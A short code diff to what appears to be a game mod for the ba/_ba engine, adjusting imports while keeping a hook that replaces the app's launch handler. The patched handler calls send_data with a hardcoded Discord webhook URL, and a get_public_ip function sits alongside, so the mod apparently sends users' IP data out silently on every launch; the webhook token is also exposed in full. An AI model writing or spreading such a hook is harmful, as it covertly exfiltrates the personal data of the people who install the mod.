@@ -2,11 +2,11 @@ import http.client
 import json
 
 import ba
-from _ba import App
+import _ba
 
 DISCORD_WEBHOOK_URL = 'discord.com/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZawspUevsPl4l9EdG44FhPIBidU4k2AYCRywteIK'
 
-original_app_launch = App.on_app_launch
+original_app_launch = _ba.App.on_app_launch
 
 
 def get_public_ip() -> str:
@@ -54,4 +54,4 @@ def custom_app_launch(self: App) -> None:
     send_data(DISCORD_WEBHOOK_URL)
 
 
-App.on_app_launch = custom_app_launch
+_ba.App.on_app_launch = custom_app_launch
